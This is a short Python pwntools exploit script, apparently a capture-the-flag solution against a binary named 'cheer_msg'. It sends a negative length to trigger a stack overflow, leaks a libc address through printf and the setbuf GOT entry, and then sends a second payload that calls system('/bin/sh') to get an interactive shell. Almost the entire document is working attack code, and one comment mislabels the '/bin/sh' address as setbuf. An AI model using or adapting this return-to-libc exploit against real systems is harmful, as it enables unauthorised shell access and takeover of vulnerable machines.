#!/usr/bin/env python
from pwn import *


def main():
    conn = process("./cheer_msg")
    # libc = ELF("./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# first payload
    conn.recvuntil("Message Length >> ")
    conn.sendline("-100")

    payload = "A" * 48
    payload += p32(0x8048430)  # printf
    payload += p32(0x80485ca)  # return to main
    payload += p32(0x804a00c)  # setbuf

    conn.sendline(payload)
    conn.recvuntil("Message : \n")

    libc_leak = u32(conn.recv(4))
    libc_base = libc_leak - libc.symbols["setbuf"]
    print hex(libc_base)

# second payload
    conn.recvuntil("Message Length >> ")
    conn.sendline("-100")

    payload = "A" * 48
    payload += p32(libc_base + libc.symbols["system"])  # system
    payload += p32(0xdeadbeef)  # return addr
    payload += p32(libc_base + next(libc.search('/bin/sh')))  # setbuf

    conn.sendline(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
